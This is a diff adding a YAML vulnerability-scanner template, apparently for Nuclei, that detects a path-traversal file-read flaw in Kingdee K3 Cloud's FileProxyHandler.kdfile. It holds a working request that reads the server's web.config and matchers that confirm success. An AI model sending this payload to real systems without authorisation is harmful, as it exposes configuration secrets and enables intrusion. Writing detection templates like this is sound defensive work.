@@ -1,0 +1,25 @@
+id: kingdee-cloud-fileproxyhandler-fileread
+info:
+  name: Kingdee K3 Cloud FileProxyHandler.kdfile - File Read
+  author: qwtd
+  severity: high
+  tags: 金蝶云星空
+
+http:
+  - raw:
+    - |
+        GET /FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "xml version"
+          - "<configuration>"
+        condition: and
+        
+      - type: status
+        status:
+          - 200
